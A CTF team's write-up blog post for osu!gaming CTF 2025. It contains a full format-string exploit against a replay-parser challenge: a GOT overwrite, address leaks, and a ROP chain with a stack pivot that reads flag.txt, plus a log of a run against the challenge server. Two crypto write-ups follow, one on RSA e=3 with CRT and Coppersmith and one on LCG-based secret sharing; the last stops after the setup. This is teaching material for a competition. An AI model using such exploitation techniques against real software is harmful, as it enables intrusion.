---
title: osu!gaming CTF 2025
date: 2025-10-27
authors:
    - all of us
visible: false # change this to true to view locally; change to false before pushing
---

This year, our team `slight_smile` took part in osu!gaming CTF 2025 and got 3rd
place! Here are our writeups for some of the interesting challs.

# `pwn/miss-analyzer-v2`

> miss-analyzer from last year was a bit buggy :((
>
> I changed some things to make it more secure, surely it's fine now, right?
>
> expected difficulty: 3/5
>
> Author: strellic

_written by samuzora_

This challenge is a osu! replay parser, and we can interact with it by uploading
hexdumps of the replay files. These are the protections enabled on the binary:

```ansi
[36m$[39m [38;5;14m: [36mchecksec[39m [1m[32manalyzer_patched[0m
[[1m[34m*[0m] '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/analyzer_patched'
    Arch:       amd64-64-little
    RELRO:      [33mPartial RELRO[39m
    Stack:      [32mCanary found[39m
    NX:         [32mNX enabled[39m
    PIE:        [31mNo PIE (0x3fe000)[39m
    RUNPATH:    [31mb'./lib'[39m
    SHSTK:      [32mEnabled[39m
    IBT:        [32mEnabled[39m
    Stripped:   [31mNo[39m
```

Since I don't actually know anything about the osu! replay file format, let's
read the decompilation to see how it's parsing the stuff.

## Analysis

The binary is protected with the following seccomp filter:

```ansi
[36m$[39m [38;5;14m: [36mseccomp-tools[39m [1m[32mdump[0m [1m[32m./analyzer[0m
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != [38;5;230mARCH_X86_64[39m) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < [38;5;120m0x40000000[39m) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != [38;5;120m0xffffffff[39m) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == [38;5;120mexecve[39m) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A == [38;5;120mexecveat[39m) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

Only `execve{:c}` and `execveat{:c}` are blocked, as well as any x86 syscalls.

In the parser logic, the hexstring is converted into raw bytes using the
`hex2bin{:c}` helper.

```c
length = hexs2bin(lineptr, &ptr);
cur_ptr = ptr;
```

The current state of reading the bytestring is stored in `cur_ptr{:c}`, and the
helper function `read_byte{:c}` will increment this pointer by one.

There are a few helper functions that are implemented using `read_byte{:c}`.
`consume_bytes{:c}` simply discards the next x bytes. `read_string{:c}` is quite
interesting, as it defines an expected format for a string, which is as follows:
1. All strings start with 0xb
2. Immediately following the start byte is a variable-length integer denoting
   the string length
3. After the variable-length integer follows the actual data in the string

The implementation of the variable-length integer is quite simple:

```c
for ( i = 0; ; i += 7 )
 {
   byte = read_byte(ptr, length);
   str_length |= (byte & 0x7F) << i;
   if ( byte >= 0 )
     break;
 }
```

The least significant 7 bits of the byte is used to denote part of the integer,
and the most significant bit denotes whether more data follows (if 1, there is
more data; if 0, there is no more data). Although there is no limit to the
length of this field, the maximum string length is bounded by the size of
the `str_length{:c}` variable which is `unsigned int{:c}`. Also, there is a
parameter `max_len{:c}` in `read_string{:c}` which prevents reading more than a
certain number of bytes. In this parser, it's always set to 0xff.

### Replay format

Knowing how these helper functions work, we can now determine the expected file
input format.

```c
mode = read_byte(&cur_ptr, &length);
if ( mode )
{
  switch ( mode )
  {
    case 1:
      puts("Mode: osu!taiko");
      break;
    case 2:
      puts("Mode: osu!catch");
      break;
    case 3:
      puts("Mode: osu!mania");
      break;
  }
} else {
      puts("Mode: osu!"); 
}
```

The first byte denotes the mode. Nothing interesting here.

```c
consume_bytes(&cur_ptr, &length, 4);
read_string(&cur_ptr, &length, format, 0xFFu);
printf("Hash: %s\n", format);
```

The next 4 bytes are consumed, followed by a hash string of maximum length 0xff.
Also nothing interesting here.

```c
read_string(&cur_ptr, &length, format, 0xFFu);
printf("Player name: ");
printf(format);
putchar(10);
```

Following is a username string, which is passed in raw to `printf{:c}`. This is
our vulnerability!

```c
read_string(&cur_ptr, &length, format, 0xFFu);
consume_bytes(&cur_ptr, &length, 10);
```

An unused string is expected after the username, and then 10 bytes of data are
discarded.

```c
v6 = read_short(&cur_ptr, &length);
printf("Miss count: %d\n", v6);
if ( v6 )
  puts("Yep, looks like you missed.");
else
  puts("You didn't miss!");
puts("=~=~=~=~=~=~=~=~=~=~=\n");
free(lineptr);
free(ptr);
seccomp_release(v12);
return 0;
```

The last field is 2 bytes indicating the number of misses. After this, the
program frees the buffers used and the seccomp filter, and exits.

So, the expected format is as follows:

```bash
mode (1 byte)
padding (4 bytes)
hash (variable-length string)
username (variable-length string)
unused (variable-length string)
padding (10 bytes)
miss_count (2 bytes)
```

## Exploit

We know that we want to target the username string. Let's write a helper
function to pack our payload:

```python
def encode_varint(value):
    encoded = bytearray()
    while True:
        byte = value & 0x7f
        value >>= 7
        if value:
            byte |= 0x80  # set continuation bit
            encoded.append(byte)
        else:
            encoded.append(byte)
            break
    return bytes(encoded)

def construct_payload(fmtstr):
    payload = b"\x00"
    payload += p32(0x0)

    # hash
    payload += p8(0xb)
    payload += flat(encode_varint(0x1))
    payload += b"a"

    # name
    payload += p8(0xb)
    payload += flat(encode_varint(len(fmtstr)))
    payload += fmtstr

    # unused
    payload += p8(0xb)
    payload += flat(encode_varint(0x1))
    payload += b"a"

    payload += b"\x00" * 10

    # missed
    payload += p16(0x0001)

    with open("./out", "wb") as file:
        file.write(payload)

    hexdump = os.popen("xxd -p -c0 ./out").read()

    sleep(0.5)

    return hexdump.encode()
```

With this, we can start planning our exploit.

### Looping

Firstly, we definitely need to exploit the fmtstr bug multiple times. This means
we need to return back to main somehow. Since PIE isn't enabled and we have
partial RELRO, we can overwrite the GOT entry of `seccomp_release{:c}` to
`main{:c}`, so we call main again right before we exit.

I used the `fmtstr_payload{:py}` function available in pwntools for most of the
writes in this challenge.

```python
payload = construct_payload(fmtstr_payload(16, {exe.got.seccomp_release: exe.sym.main}))
```

### Leaks

Before we start ropping, we need to leak the libc and stack address. This is the
state of the registers when we break at the `printf{:c}` call:

```ansi
LEGEND: [33mSTACK[39m | [34mHEAP[39m | [31mCODE[39m | [35mDATA[39m | [4m[31mWX[0m | RO
DATA
 [1mRAX [0m 0
[31m*[1mRBX [0m [34m0x16aefba0[39m ◂— '00000000000b01610b0725707c253324700b0161000000000000000000000100'
 [1mRCX [0m [31m0x7437265148f7 (write+23)[39m ◂— [38;5;148mcmp[38;5;15m [38;5;81mrax[38;5;15m,-[38;5;141m0x1000[39m /* 'H=' */
 [1mRDX [0m 0
[31m*[1mRDI [0m [33m0x7ffc98260e70[39m
[31m*[1mRSI [0m [33m0x7ffc9825ed00[39m ◂— 'Player name: t'
 [1mR8  [0m 0xd
 [1mR9  [0m 0x7fffffff
 [1mR10 [0m 0x402179 ◂— 'Player name: '
 [1mR11 [0m 0x246
 [1mR12 [0m [33m0x7ffc98261228[39m —▸ [33m0x7ffc98262a27[39m ◂— '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/analyzer_patched'
 [1mR13 [0m [31m0x401749 (main)[39m ◂— [38;5;148mendbr64[38;5;15m [39m
 [1mR14 [0m 0x403e08 (__do_global_dtors_aux_fini_array_entry) —▸ [31m0x4012e0 (__do_global_dtors_aux)[39m ◂— [38;5;148mendbr64[38;5;15m [39m
 [1mR15 [0m [35m0x743726821040 (_rtld_global)[39m —▸ [35m0x7437268222e0[39m ◂— 0
[31m*[1mRBP [0m [33m0x7ffc98260f90[39m —▸ [33m0x7ffc98261110[39m ◂— 1
[31m*[1mRSP [0m [33m0x7ffc98260e20[39m —▸ [34m0x16aef010[39m ◂— 0x2000000000007
 [1mRIP [0m [31m0x401ada (main+913)[39m ◂— [38;5;148mcall[38;5;15m [31mprintf@plt
```

We have a stack address in rsi, and libc address in rcx. These are accessed via
the 1st and 3rd format string indexes respectively, according to the x86_64
calling convention. Therefore, we can leak them with this payload:

```python
sleep(0.5)
p.clean()
payload = construct_payload(b"%p|%3$p")
p.send(payload)

p.recvuntil(b"Player name: ")

stack_leak = int(p.recvuntil(b"|", drop=True), 16)
libc.address = int(p.recvline(), 16) - 0x1148f7

print(f"{stack_leak = :0x}")
print(f"{libc.address = :0x}")
```

### ROP time!

Let's gather all our gadgets before we start ropping. Using the gadgets in the
provided libc, I narrowed the useful gadgets to these:

```asm
; 0x0000000000035732
pop rsp ;
ret ;

; 0x000000000002a3e5
pop rdi ; 
ret ;

; 0x000000000002be51
pop rsi ; 
ret ;

; 0x0000000000108b73 
pop rdx ; 
pop rcx ; 
pop rbx ; 
ret ;
```

In this chain, there's no need to use syscall because the seccomp filter is
quite lenient. So I'll just use the libc-provided wrappers.

We'll place the chain in a writable region in memory, and subsequently stack
pivot to that region using the `pop rsp{:asm}` gadget.

There's a small problem though. Because the maximum length of the username is
0xff bytes, we can't write the entire chain in one shot. We can use multiple
runs to slowly write the chain, and also try to reduce the size of the payload
by setting `write_size="short"{:py}` in `fmtstr_payload{:py}`.

```python
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rcx_rbx = libc.address + 0x0000000000108b73
pop_rsp = libc.address + 0x0000000000035732
ret = 0x401bea
OPEN = libc.sym.open
SENDFILE = libc.sym.sendfile

fake_stack = 0x404200

# name
payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack-0x10: u64(b"flag.txt"),
        fake_stack+0x00: pop_rdi
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x08: fake_stack - 0x10,
        fake_stack+0x10: pop_rsi,
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x18: 0x0,
        fake_stack+0x20: pop_rdx_rcx_rbx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x28: 0x0, # rdx
        fake_stack+0x30: 0x0, # rcx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x38: 0x0, # rbx
        fake_stack+0x40: OPEN
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x48: pop_rdi,
        fake_stack+0x50: 0x1,
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x58: pop_rsi,
        fake_stack+0x60: 0x3,
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x68: pop_rdx_rcx_rbx,
        fake_stack+0x70: 0x0, # rdx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x78: 0x100, # rcx
        fake_stack+0x80: 0x0, # rbx
    })
)
p.send(payload)

payload = construct_payload(
    fmtstr_payload(16, {
        fake_stack+0x88: SENDFILE
    })
)
p.send(payload)
```

Finally, to trigger the chain, we need to overwrite the saved RIP and stack
pivot to our fake stack. From the stack leak earlier, we can determine the saved
RIP of the current stack frame in GDB, and place the following chain there:

```python
target_rip = stack_leak + 0x1218

payload = construct_payload(
    fmtstr_payload(16, {
        0x404060: ret, # movaps
        target_rip: pop_rsp,
        target_rip+0x8: fake_stack
    }, write_size="short")
)
p.send(payload)
```

With this, we're done with the challenge!

```ansi
[1m[32m●[0m [36mcomp/2025-H0/osuctf/miss-analyzer-v2/dist[39m
[36m$[39m [38;5;14m: [36mpython3[39m [1m[32msolve.py[0m
[[1m[34m*[0m] '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/analyzer_patched'
    Arch:       amd64-64-little
    RELRO:      [33mPartial RELRO[39m
    Stack:      [32mCanary found[39m
    NX:         [32mNX enabled[39m
    PIE:        [31mNo PIE (0x3fe000)[39m
    RUNPATH:    [31mb'./lib'[39m
    SHSTK:      [32mEnabled[39m
    IBT:        [32mEnabled[39m
    Stripped:   [31mNo[39m
[[1m[34m*[0m] '/home/samuzora/ctf/comp/2025-H0/osuctf/miss-analyzer-v2/dist/lib/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      [33mPartial RELRO[39m
    Stack:      [32mCanary found[39m
    NX:         [32mNX enabled[39m
    PIE:        [32mPIE enabled[39m
    SHSTK:      [32mEnabled[39m
    IBT:        [32mEnabled[39m
    Stripped:   [31mNo[39m
    Debuginfo:  [31mYes[39m
[[1m[34m◐[0m] Opening connection to miss-analyzer-v2.challs.sekai.team on port 1337: Trying 34.38
[[1m[32m+[0m] Opening connection to miss-analyzer-v2.challs.sekai.team on port 1337: Done
target_rip = 7ffc2e8b72c8
libc.address = 7d50a25f0000

... (a lot of spam from the printfs)



                                        \x10aaa`@@
Miss count: 1
Yep, looks like you missed.
=~=~=~=~=~=~=~=~=~=~=

osu{fmtstr_in_the_b1g_2025}[[1m[34m*[0m] Got EOF while reading in interactive
```

---

# `crypto / please-nominate`

> ok this time i'm going to be a bit more nice and personal when sending my message
>
> expected difficulty: 3/5
>
> Author: wwm

_written by wrenches and azazo_

We're given a relatively small source file and its output.

```python
from Crypto.Util.number import *

FLAG = open("flag.txt").read()

BNS = ["Plus4j", "Mattay", "Dailycore"]
print(len(FLAG))

for BN in BNS:
    print("message for", BN)
    message = bytes_to_long(
        (f"hi there {BN}, " + FLAG).encode()
    )
    n = getPrime(727) * getPrime(727)
    e = 3
    print(n)
    print(pow(message, e, n))
```

Let's refer to the moduli as $ n_i $, the plaintexts as $ p_i | \text{flag} $, and the ciphertexts as $c_i$, where | denotes concatenation. We're given the moduli $n_i$, the value of $a_i$, and the ciphertexts $c_i$. The goal is to solve for $\text{flag}$.

## Modelling

The approach here is to _model_ the information we get the problem into something more mathematical. We'll want to describe it as a set of polynomials, and continue the analysis from there. Recall that in RSA with $e = 3$, we can just model it as a cubic:

$$ 

f_i(x) = x^3 \mod N 

$$ 

Furthermore, accounting for our given values $c_i$ (which are given to us, and are therefore constants) we can further express our polynomial as the following, with the implication that the _root_ of this polynomial would be our flag:

$$ 

f_i(x) \equiv x^3 - c_i \mod N 

$$

If we do this for all $i$, we will essentially have a family of polynomials $f_1, f_2, f_3$, all with the same shared root $x$, and we can do... something with that (we'll get there when we get there).

But however, recall that we have a custom _prepended_ message at the front of each plaintext. So this isn't exactly right, still - we need to manipulate these polynomials such that our $flag$ will be a shared root between all $f_i$. Prepending isn't something we can cleanly express as a mathematical expression, so we have to represent the concatenation operation as the _addition_ of some value $a_i$ which we can derive from the `hi there {bn}` message. It should be obvious how to do this - just bitshift the integer value of the message by $8N$, where N is the number of bytes in the flag (we know this to be 147, according to our provided output). 

We'll retrieve some values $a_i$ for each $i$, and we can finally properly model our polynomials with our shared root $\text{flag}$:

$$

f_i(x) \equiv (a_i + x)^3 - c_i \mod N

$$

## Background

For challenges like this, we would ideally want to apply _Coppersmith's method_, a lattice-based method to find _small_ roots of polynomials defined over some ring of polynomials $(\mathbb{Z}/N\mathbb{Z})[x]$ with $N$ composite.

A brief rundown on Coppersmith: finding integer solutions to a polynomial $ f(x) $ mod some value $ N $ is a lot, lot harder than just finding integer solutions to a polynomial $ f(x) $ in _general_. However, consider - what if for our value $ f(x) $, $ N $ was very large, to the point where $ f(x) < N $? This would mean that taking the modulus of $ f(x) $ with respect to $ N $ would effectively do nothing. We'd essentially be reducing it down to the easier problem of finding solutions over the integers.

For this to be done, we need to meet two requirements: we need our root $ x $ to be sufficiently small, and we also need our coefficients of the polynomial to be small as well. _Smallness_ is measured with respect to the modulus N, of course, $ x < N^\frac{1}{3} $ (for this specific polynomial) is sufficient.

The problem is, $ x $ is around 1200 bits, and each individual $ N_i $ is the product of two 727-bit (haha wysi wysi) primes. $ x $ is not small enough with respect to our individual $ N_i $ values for Coppersmith to be effective. If we were somehow able to construct a polynomial with a larger modulus that still retains $ \text{flag} $ as a small root, then it would work.

## CRT

So let's work on constructing that larger polynomial. We want to define some cubic $ g(x) \bmod \prod_{i=1}^{3} N_i $ such that our target $ \text{flag} $ root remains intact. 

We can do this by leveraging the Chinese Remainder Theorem. Consider a cubic function $ g $ with the following properties:

$$

g(x) \equiv Ax ^ 3 + Bx ^ 2 + Cx + D \mod N_1 N_2 N_3

$$

where $ A, B, C, D $ satisfy the following congruence relations:

$$

A \equiv A_i \mod N_i
\\
B \equiv B_i \mod N_i
\\
C \equiv C_i \mod N_i
\\
D \equiv D_i \mod N_i

$$

Does this cubic retain $flag$ as a root? The answer is yes. Definitionally, if we just take $ g(\text{flag}) $ (with the knowledge that $ f_i(\text{flag}) \equiv 0 \mod N_i $), we can see that all values of $ g(\text{flag}) \equiv 0 \mod N_i $, i.e., all $N_i$ _divide_ $ g(\text{flag}) $, and therefore $ N $ must divide $ g(\text{flag}) $ too.

Let's take a step back and consider what this would actually accomplish - we would now have a polynomial with a root $ flag $ of somewhere around 1200 bits, but now our modulus is around 4000 bits. We've now managed to formulate a polynomial with a "small" root, relative to the modulus. All that's left is to similarly reduce the coefficients of our polynomial $ g(x) $ using lattice reduction.

# `crypto / ssss+`

> can you do it again, but with hidden?
> 
> expected difficulty: 3/5
> 
> Author: wwm

_written by azazo_

```py
#!/usr/local/bin/python3
from Crypto.Util.number import *
import random

p = 2**255 - 19
k = 15
SECRET = random.randrange(0, p)

def lcg(x, a, b, p):
    return (a * x + b) % p

pp = getPrime(256)
a = random.randrange(0, pp)
b = random.randrange(0, pp)
with open("log.txt", "w+") as f: f.write(f"{a}, {b}, {pp}\n")
poly = [SECRET]
while len(poly) != k: poly.append(lcg(poly[-1], a, b, pp))
with open("log.txt", "a") as f: f.write(str(poly))

def evaluate_poly(f, x):
    return sum(c * pow(x, i, p) for i, c in enumerate(f)) % p

print("welcome to ssss", flush=True)
for _ in range(k - 1):
    x = int(input())
    assert 0 < x < p, "no cheating!"
    print(evaluate_poly(poly, x), flush=True)

if int(input("secret? ")) == SECRET:
    FLAG = open("flag.txt").read()
    print(FLAG, flush=True)
```

We have a polynomial $f(x) = \sum_{i=0}^{14} c_{i} x^i$ with the coefficients being consecutive outputs from a linear congruential generator (LCG) with unknown parameters:

$$
\begin{align}
c_1 &= \left(a c_0 + b\right) \bmod p\\
c_2 &= \left(a c_1 + b\right) \bmod p\\
&\vdots\\
c_{14} &= \left(a c_{13} + b\right) \bmod p
\end{align}
$$

We are then allowed to evaluate $f(x) \bmod 2^{255}-19$ for 14 times, before we must give the value of $c_0$ to the server to get the flag. There is also no simple way to cheese this challenge as the `assert 0 < x < p{:py}` check prevents us from entering multiples of $2^{255}-19$.

